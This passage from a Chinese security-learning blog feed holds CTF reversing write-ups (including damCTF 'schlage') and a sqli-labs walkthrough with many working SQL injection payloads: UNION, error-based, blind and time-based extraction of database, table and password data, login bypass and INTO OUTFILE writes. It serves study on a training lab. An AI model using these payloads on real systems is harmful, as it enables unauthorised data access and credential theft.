<img src="https://s1.ax1x.com/2020/10/13/0h0zHH.jpg" alt="0h0zHH.jpg" border="0" />
该函数将第三部分的四字节密码减去了一个数，之后，又执行第二个SEH函数。`有个疑问是这里将返回值置0，又怎么执行第二个SEH函数。`
最后计算如下：
`3C4C7440 xor 74406653 =480C 1213 + 21486553 - 48335621=21212145=!!!E`
反序排列为`E!!!`
</li>
<li><p>最后三部分密码组合在一起：<code>weLl_d@nE!!!</code></p>
<img src="https://s1.ax1x.com/2020/10/13/0hDnsO.jpg" alt="0hDnsO.jpg" border="0" />
密码正确




</li>
</ol>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>damCTF- rev/schlage (beginner) __WP</title>
    <url>/2020/10/12/schlage%20(beginner)%20__WP/</url>
    <content><![CDATA[<h2 id="damCTF-rev-schlage-beginner-WP"><a href="#damCTF-rev-schlage-beginner-WP" class="headerlink" title="damCTF- rev/schlage (beginner) __WP"></a>damCTF- rev/schlage (beginner) __WP</h2><ol>
<li><p>先用<code>file</code>命令查看</p>
<img src="https://s1.ax1x.com/2020/10/12/0Rkyfe.jpg" alt="0Rkyfe.jpg" border="0" />
可以看到是64位的ELF文件,debug信息还在
</li>
<li><p>接着使用radare2反汇编</p>
<img src="https://s1.ax1x.com/2020/10/12/0RE8xJ.jpg" alt="0RE8xJ.jpg" border="0" />

</li>
</ol>
<p>使用<code>VV</code>命令进入视图模式</p>
<a id="more"></a>
<hr>
<p>我们的任务是解锁，这里又5把锁<br><img src="https://s1.ax1x.com/2020/10/12/0RVJfS.jpg" alt="0RVJfS.jpg" border="0" /></p>
<hr>
<p>关键的代码是这5个函数<br><img src="https://s1.ax1x.com/2020/10/12/0RVIk6.jpg" alt="0RVIk6.jpg" border="0" /></p>
<hr>
<h3 id="Pin1"><a href="#Pin1" class="headerlink" title="Pin1"></a>Pin1</h3><p>第三把锁比较简单，来看第一把锁<br><img src="https://s1.ax1x.com/2020/10/12/0RZxKJ.jpg" alt="0RZxKJ.jpg" border="0" /></p>
<p>也可以在视图模式按<code>o</code>再输入函数旁边的字母<br><img src="https://s1.ax1x.com/2020/10/12/0Rnph6.jpg" alt="0Rnph6.jpg" border="0" /></p>
<p>这是一个循环操作，共五次，每一次将两个数字异或，最后和<code>0xee</code>比较，相同则成功<br><code>rbp+rax-0x0e</code>即指向开头移入地址的5个数</p>
<p><code>0x3e xor 0x57 xor 0x81 xor 0xd3 xor 0x 25 xor 0x 93 xor 0xee</code> 结果为0<code>x99</code></p>
<h4 id="jle："><a href="#jle：" class="headerlink" title="jle："></a>jle：</h4><p>JNB al, bl  ；al里的内容不等于bl时跳转<br>JBE al, bl ；al里的内容小于或等于bl时跳转</p>
<p>；同理，JGB是大于或等于，<code>JLE是小于或等于</code><br>；A（above）大于，B（below）小于，E（equal）等于，用于比较无符号数<br>；G（great）大于，L（less than）小于， E（equal）等于，用于比较带符号数</p>
<hr>
<h3 id="pin5"><a href="#pin5" class="headerlink" title="pin5"></a>pin5</h3><img src="https://s1.ax1x.com/2020/10/12/0RuadA.jpg" alt="0RuadA.jpg" border="0" />
#### srand()
第5把锁用到了`srand()`和`rand()`两个函数。

<p>根据种子产生随机数</p>
<ol>
<li>给srand()提供一个种子，它是一个unsigned int类型；</li>
<li>调用rand()，它会根据提供给srand()的种子值返回一个随机数(在0到RAND_MAX之间)；</li>
</ol>
<p>也就是，一个种子，它所产生的随机数是固定的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a=<span class="number">1111638594</span>； <span class="comment">//0x42424242</span></span><br><span class="line">srand(a); </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;rand()&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<p>输入<code>rand()</code>生成的随机数即可，即为<code>1413036362</code></p>
<h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h4><p>lea是“load effective address”的缩写，简单的说，lea指令可以用来将一个内存地址<code>直接</code>赋给目的操作数，例如：lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax，而不是把ebx+8处的<code>内存地址里</code>的<code>数据</code>赋给eax。而mov指令则恰恰相反，例如：mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p>
<hr>
<h3 id="pin2"><a href="#pin2" class="headerlink" title="pin2"></a>pin2</h3><img src="https://s1.ax1x.com/2020/10/12/0RKg1K.jpg" alt="0RKg1K.jpg" border="0" />
查看汇编代码可以知道，pin2根据实际输出了一个种子，根据种子调用`rand() `即可。

<p>这个种子下一把锁还要用到，再一次调用<code>rand()</code>，获得的是第二个随机数。</p>
<hr>
<h3 id="pin4"><a href="#pin4" class="headerlink" title="pin4"></a>pin4</h3><p>我认为这是最难得了，主要是编程。<br>直接看r2 太复杂，所以我用IDA PRO，然后F5反编译。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your favorite sentence?&quot;</span>);</span><br><span class="line">   fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">   s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;         <span class="comment">//换行符变为0x00</span></span><br><span class="line">   v3 = rand() % <span class="number">10</span> + <span class="number">65</span>;</span><br><span class="line">   v1 = <span class="number">0</span>;</span><br><span class="line">   v4 = <span class="built_in">strlen</span>(s);                             <span class="comment">// strlen 遇到/0结束</span></span><br><span class="line">   <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">     v1 += v3 ^ s[i];        <span class="comment">//将随机值与字符异或，结果相加要为291</span></span><br><span class="line">   <span class="keyword">if</span> ( v1 == <span class="number">291</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">&quot;Such a cool sentence!&quot;</span>);</span><br><span class="line">     byte_20203C = <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">&quot;Not a big fan of that sentence&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>注释已经写在代码中，接下来，就是编程破解得到符合的字符串。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        <span class="comment">/*FILE *pe=NULL;</span></span><br><span class="line"><span class="comment">        char s[1]=&#123;&#x27;1&#x27;&#125;;</span></span><br><span class="line"><span class="comment">        pe=popen(&quot;nc chals.damctf.xyz 31932&quot;,&quot;rw&quot;);</span></span><br><span class="line"><span class="comment">        if(pe==NULL)</span></span><br><span class="line"><span class="comment">                cout&lt;&lt;&quot;connect failed&quot;&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">        while (1)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">                fwrite(s,sizeof(s),1,pe);</span></span><br><span class="line"><span class="comment">                fgets(s,20,pe);</span></span><br><span class="line"><span class="comment">                cout&lt;&lt;s;</span></span><br><span class="line"><span class="comment">                break;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        pclose(pe);*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> a=<span class="number">1602480388</span>;<span class="comment">//1111638594</span></span><br><span class="line">        srand(a); </span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;rand()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> v3 = rand() % <span class="number">10</span> + <span class="number">65</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;v3=&quot;</span>&lt;&lt;v3&lt;&lt;<span class="built_in">endl</span>; <span class="comment">//=74</span></span><br><span class="line">        <span class="keyword">int</span> remain=<span class="number">291</span>; <span class="comment">//291下搜索</span></span><br><span class="line">        <span class="keyword">int</span> qu=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> resu;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;  <span class="comment">//最大允许输入31个字符</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">58</span>;j++)&#123; <span class="comment">//从A开始搜索</span></span><br><span class="line">                        resu=v3^<span class="keyword">int</span>(<span class="string">&#x27;A&#x27;</span>+j);</span><br><span class="line">                        <span class="keyword">if</span>(resu==<span class="number">0</span>) <span class="comment">//==0没有用</span></span><br><span class="line">                                &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> ( resu&lt;remain || remain%resu==<span class="number">0</span>)&#123; <span class="comment">//实际上感觉不用加后面的条件</span></span><br><span class="line">                                qu+=remain/resu; <span class="comment">//累计得到的字符数</span></span><br><span class="line">                                <span class="keyword">if</span>(qu&gt;<span class="number">31</span>)&#123; <span class="comment">//不能大于31</span></span><br><span class="line">                                        qu-=remain/resu;</span><br><span class="line">                                        <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;remain/resu;k++) <span class="comment">//输出成功的字符</span></span><br><span class="line">                                        <span class="built_in">cout</span>&lt;&lt;<span class="keyword">char</span>(<span class="string">&#x27;A&#x27;</span>+j);</span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                remain=remain%resu; <span class="comment">//更新余下值</span></span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;i=  &quot;</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;   &quot;</span>&lt;&lt;<span class="string">&quot;resu=&quot;</span>&lt;&lt;resu&lt;&lt;<span class="string">&quot;qu= &quot;</span>&lt;&lt;qu&lt;&lt;<span class="string">&quot;remain=&quot;</span>&lt;&lt;remain&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                i=qu<span class="number">-1</span>; <span class="comment">//更新i</span></span><br><span class="line">                                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;after i= &quot;</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (remain==<span class="number">0</span>) <span class="comment">//填满291 成功</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;find&quot;</span>&lt;&lt;<span class="string">&quot;i=&quot;</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(i&gt;=<span class="number">31</span>) <span class="comment">//最后都没有搜索到，失败</span></span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">&quot;don&#x27;t find&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;remainder= &quot;</span>&lt;&lt;remain&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>输入字符，成功解锁。</p>
<img src="https://s1.ax1x.com/2020/10/12/0Rlsts.jpg" alt="0Rlsts.jpg" border="0" />

<p>最后flag文件在远程服务器，但链接时间很短，可能需要脚本自动化发送，有点小难😢</p>
<hr>
<h4 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h4><p>C 库函数 char *fgets(char *str, int n, FILE *stream) 从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内。当读取 (n-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</p>
<h4 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h4><p>C 库函数 size_t strlen(const char *str) 计算字符串 str 的长度，直到空结束字符，但不包括空结束字符。</p>
<h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>不愧是新手题，只是最后编程花了我不少时间。</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>burpsuite 安全学院笔记</title>
    <url>/2019/05/17/sql-more-details/</url>
    <content><![CDATA[<p>For a UNION query to work, two key requirements must be met:</p>
<ol>
<li><strong>The individual queries must return the same number of columns.</strong></li>
<li>The data types in each column must be compatible between the individual queries.</li>
</ol>
<p>‘ ORDER BY 1–<br>‘ ORDER BY 2–<br>‘ ORDER BY 3–</p>
<p>‘ UNION SELECT NULL–<br>‘ UNION SELECT NULL,NULL–<br>‘ UNION SELECT NULL,NULL,NULL–</p>
<a id="more"></a>
<p>The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct.<br>On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called DUAL which can be used for this purpose. So the injected queries on Oracle would need to look like: ‘ UNION SELECT NULL FROM DUAL–.<br>The payloads described use the double-dash comment sequence – to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.</p>
<p>Database type     Query<br>Microsoft, MySQL     SELECT @@version<br>Oracle     SELECT * FROM v$version<br>PostgreSQL     SELECT version() </p>
<p>For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the “Cluster bomb” attack type, and work through all permutations of offsets and character values. </p>
<p>Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The “Status” column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position. </p>
]]></content>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs(less-1__less-22)</title>
    <url>/2019/02/26/sqli-labs/</url>
    <content><![CDATA[<hr>
<p><strong>闭合有<code>&#39;</code> <code>&quot;</code> <code>)</code> 单双引号不能同时存在，<code>)</code> 可有多个</strong></p>
<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><blockquote>
<p>single 单个的<br>quote 引号<br>变量前面加 <strong>?</strong><br>information_schema.tables<br>information_schema.columns<br>information_schema.schemata</p>
</blockquote>
<p>在Less-1里的index.php中添加 <code>echo $sql;</code> 可在网页中显示查询代码，<code>echo &quot;&lt;br&gt;&quot;;</code> 表示换行</p>
<a id="more"></a>

<hr>
<ol>
<li><ul>
<li><code>?id=1&#39;  and 1=1 --+</code> 没有报错，返回正确结果</li>
<li><code>?id=10&#39;</code> 报错 <code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;10&#39;&#39; LIMIT 0,1&#39; at line 1</code></li>
<li><code>?id=1&#39; and 1=2 --+ </code> 没有正确结果<br>经过这三个步骤说明是字符型注入</li>
</ul>
</li>
<li><p>使用order by来判断有几个字段<br><code>?id=1&#39; order by 4--+</code><br>报错<code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code><br>说明有3个字段</p>
</li>
<li><p><code>LIMIT 0,1</code> 表示结果只显示一行<br><code>?id=-1&#39; union select 1,2,3 --+</code> 看哪个字段可以回显<br><a href="https://imgchr.com/i/k7xiTg"><img src="https://s2.ax1x.com/2019/02/28/k7xiTg.png" alt="k7xiTg.png"></a></p>
</li>
<li><p><code>?id=1&#39; union select 1,concat_ws(&#39;_&#39;,version(),user(),database()),@@basedir --+</code><br>得到版本，用户，当前数据库，数据路径<br><a href="https://imgchr.com/i/k7zDbT"><img src="https://s2.ax1x.com/2019/02/28/k7zDbT.png" alt="k7zDbT.png"></a></p>
</li>
</ol>
<p><em>concat_ws 带分隔符的链接</em></p>
<ol>
<li><code>?id=-1&#39; union select 1, group_concat(table_name),3 from information_schema.tables where table_schema = database() --+</code><br>得到当前库的表名<br><a href="https://imgchr.com/i/kHSWFg"><img src="https://s2.ax1x.com/2019/02/28/kHSWFg.png" alt="kHSWFg.png"></a><br><code>?id=-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 --+ </code><br>查看数据库名信息</li>
</ol>
<p><em>group_concat 行转列</em></p>
<ol>
<li><p><code>?id=-1 &#39; union select 1, (select group_concat(column_name)  from information_schema.columns where table_name=&quot;users&quot;), 3 --+</code><br>users 表的列名<br><a href="https://imgchr.com/i/kHp8hQ"><img src="https://s2.ax1x.com/2019/02/28/kHp8hQ.png" alt="kHp8hQ.png"></a></p>
</li>
<li><p><code>?id=-1 &#39; union select 1,(select group_concat(password) from users) ,3 --+</code><br>得出账户密码<br><a href="https://imgchr.com/i/kHpan0"><img src="https://s2.ax1x.com/2019/02/28/kHpan0.png" alt="kHpan0.png"></a></p>
</li>
</ol>
<hr>
<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><ul>
<li><code>?id=1&#39;</code>报错</li>
<li><code>?id=1 and 1=1</code>正确</li>
<li><code>?id=1 and 1=2</code>错误<br>可知是数字型注入</li>
</ul>
<p><em>解题与第一题类似，不再赘述</em></p>
<hr>
<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>查看源码可知，用<code>()</code>加在了id两边，所以只要将<code>()</code>闭合就行了<br><code>?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(password) from users),3--+</code></p>
<p><a href="https://imgchr.com/i/kHbj8P"><img src="https://s2.ax1x.com/2019/03/01/kHbj8P.png" alt="kHbj8P.png"></a></p>
<hr>
<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>查看源码，id两边加了”,用<code>?id=-1&quot;) </code>闭合</p>
<hr>
<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p><strong><em>双注入</em></strong></p>
<ol>
<li>Rand() //随机函数</li>
<li>Floor() //取整函数</li>
<li>Count() //汇总函数</li>
<li>Group by clause //分组语句</li>
</ol>
<p><a href="https://blog.csdn.net/Leep0rt/article/details/78556440">https://blog.csdn.net/Leep0rt/article/details/78556440</a></p>
<p><code>?id=1&#39; union select count(*),1,concat((select database()), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+</code><br><a href="https://imgchr.com/i/kbMSh9"><img src="https://s2.ax1x.com/2019/03/01/kbMSh9.png" alt="kbMSh9.png"></a><br>select 查询列数要相同，否则报错</p>
<p><code>?id=1&#39; union select count(*),1,concat((select password from users limit 5,1), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+</code><br><a href="https://imgchr.com/i/kbQiCj"><img src="https://s2.ax1x.com/2019/03/01/kbQiCj.png" alt="kbQiCj.png"></a><br>用<code>group_concat</code>会报错，使用<code>limit</code></p>
<p>更新于2019-03-01 22:21:15 星期五</p>
<hr>
<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>尝试注入后可知是用<code>&quot;</code>闭合，字符串型<br>其他和上题一致<br><code>?id=1&quot;  union select count(*),concat( (select user()),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p>
<p><a href="https://imgchr.com/i/kLirA1"><img src="https://s2.ax1x.com/2019/03/03/kLirA1.png" alt="kLirA1.png"></a></p>
<p><code>?id=1&quot;  union select count(*),concat( (select table_name from information_schema.tables where table_schema=database() limit 3,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p>
<p><code>?id=1&quot;  union select count(*),concat( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 5,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p>
<p><code>?id=1&quot;  union select count(*),concat( (select password from users limit 0,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p>
<p>更新于2019-03-03 11:48:51 星期日</p>
<hr>
<h2 id="Lss-7"><a href="#Lss-7" class="headerlink" title="Lss-7"></a>Lss-7</h2><h5 id="利用outfile文件"><a href="#利用outfile文件" class="headerlink" title="利用outfile文件"></a>利用outfile文件</h5><p><em>一般在Sql查询语句中，想要正常查询到信息，只能在最里层有引号，外层全是小括号。即已知注入类型后依次增加括号数必能分析出括号数（存在注入点）。<br>数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限<br>需要在指定的目录下进行数据的导出。<br>需要注意的是利用数据库file权限向操作系统写入文件时， 对于相同文件名的文件不能覆盖</em></p>
<p><em>secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行load data、into outfile语句和load_file()函数,这些操作需要用户具有file权限。</em></p>
<ol>
<li>如果这个参数为空，这个变量没有效果。</li>
<li>如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它.</li>
<li>如果这个参数为null，Mysql服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。</li>
</ol>
<p><em>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径</em></p>
<p><em>在Mysql中，需要注意路径转义的问题，即用\分隔。</em></p>
<p><strong><a href="https://www.jianshu.com/p/7b9256de20d1">https://www.jianshu.com/p/7b9256de20d1</a></strong></p>
<p>经过测试，用<code>&#39;))</code> 来闭合</p>
<p><code>?id=1&#39;)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile &quot;C:\\xampp\\mysql\\data\\security\\4.txt&quot; --+</code></p>
<p><a href="https://imgchr.com/i/kXV2Tg"><img src="https://s2.ax1x.com/2019/03/04/kXV2Tg.png" alt="kXV2Tg.png"></a></p>
<p><code>?id=1&#39;)) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;) into outfile &quot;C:\\xampp\\mysql\\data\\security\\5.txt&quot; --+</code></p>
<p><a href="https://imgchr.com/i/kXVb0U"><img src="https://s2.ax1x.com/2019/03/04/kXVb0U.png" alt="kXVb0U.png"></a></p>
<p><code>?id=1&#39;)) union select 1,2,(select group_concat(password) from users) into outfile &quot;C:\\xampp\\mysql\\data\\security\\6.txt&quot; --+</code></p>
<p><a href="https://imgchr.com/i/kXZS6x"><img src="https://s2.ax1x.com/2019/03/04/kXZS6x.png" alt="kXZS6x.png"></a></p>
<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><h5 id="盲注布尔注入"><a href="#盲注布尔注入" class="headerlink" title="盲注布尔注入"></a>盲注布尔注入</h5><p><em>当一个页面，存在注入，没显示位，没有数据库出错信息，只能通过页面返回正常不正常进行判断进行sql注入。</em></p>
<ol>
<li>exists（）<br>用于检查  子查询是否有返回数据。 结果是 ture或者false</li>
<li>ascii（）<br>把字符转化成ascii码</li>
<li>substr（）<br>substr（string string，num start，num length）；<br>偏移从1开始的 并不是0；</li>
</ol>
<p><em>DISTINCT 去重复</em><br><code>?id=1&#39; and (select ascii(substr( (select database()) ,1,1))&gt;115) --+ </code></p>
<p><code>?id=1&#39; and ((select count(distinct+table_schema) from information_schema.tables)&gt;6)--+</code></p>
<p><code>?id=1&#39; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101)--+</code></p>
<p><code>?id=1&#39; and (select ascii(substr( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1) ,1,1))&gt;11) --+</code></p>
<p><code>?id=1&#39; and (select ascii(substr( (select password from users limit 0,1) ,1,1))&gt;68) --+</code></p>
<p><em>select database() 作为一个语句加括号</em><br>用脚本来跑</p>
<p>更新于2019-03-04 23:09:10 星期一</p>
<hr>
<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><h5 id="盲注基于时间"><a href="#盲注基于时间" class="headerlink" title="盲注基于时间"></a>盲注基于时间</h5><p><em>if( expr1 , expr2 , expr3 ) expr1 true 返回expr2 false 返回 expr3</em></p>
<p><code>?id=1&#39; and if((select ascii(substr(database(),1,1)))=115,sleep(5),1) --+</code></p>
<p>利用页面返回时间判断对错<br>例如<br><code>?id=1&#39; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101,sleep(5),1) --+</code></p>
<hr>
<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>与上题相同，不过利用<code>&quot;</code>进行闭合</p>
<p>更新于2019-03-06 20:29:31 星期三</p>
<hr>
<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><pre><code>GET - 从指定的资源请求数据。
POST - 向指定的资源提交要被处理的数据</code></pre>
<p>输入<code>&#39;</code>报错，知用<code>&#39;</code>闭合<br><code>uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; or &#39;1&#39;=&#39;1&amp;submit=Submit</code><br>可以直接爆出来<br>其他相同<br><code>uname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; union select 1,2#&amp;submit=Submit</code><br><a href="https://imgchr.com/i/A9VId1"><img src="https://s2.ax1x.com/2019/03/10/A9VId1.png" alt="A9VId1.png"></a></p>
<hr>
<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>实验可知用<code>&quot;)</code>闭合<br>其他相同</p>
<hr>
<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>实验知用<code>&#39;)</code> 闭合<br>其他相同，例如</p>
<p><code>uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(database()))) #&amp;submit=Submit</code></p>
<p><a href="https://imgchr.com/i/A9aHHI"><img src="https://s2.ax1x.com/2019/03/10/A9aHHI.png" alt="A9aHHI.png"></a></p>
<p><code>uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) #&amp;submit=Submit</code></p>
<p><a href="https://imgchr.com/i/A9azvQ"><img src="https://s2.ax1x.com/2019/03/10/A9azvQ.png" alt="A9azvQ.png"></a></p>
<hr>
<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>实验知用<code>&quot;</code>闭合<br>其他和上题相同</p>
<hr>
<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>实验知用<code>&#39;</code>闭合<br>但没用报错信息<br>所以使用时间或布尔注入<br><code>uname=&#39; or if(ascii(substr(database(),1,1))=115,sleep(0.5),1) #&amp;passwd=1&amp;submit=Submit</code></p>
<hr>
<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>实验知用<code>&quot;</code>闭合<br>其他和上题相同</p>
<hr>
<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>在uname中注入，都没有反应<br>在password中注入，也没有反应<br>后知先验证用户名正确后，才执行password</p>
<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p><code>uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,version(),0x7e),1)# &amp;submit=Submit</code></p>
<p><a href="https://imgchr.com/i/A98NW9"><img src="https://s2.ax1x.com/2019/03/10/A98NW9.png" alt="A98NW9.png"></a></p>
<p><code>uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)# &amp;submit=Submit</code></p>
<p><a href="https://imgchr.com/i/A9JFUS"><img src="https://s2.ax1x.com/2019/03/10/A9JFUS.png" alt="A9JFUS.png"></a><br>其他相同</p>
<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>使用正确账号密码后，页面显示user-agent，则可以在这上面注入</p>
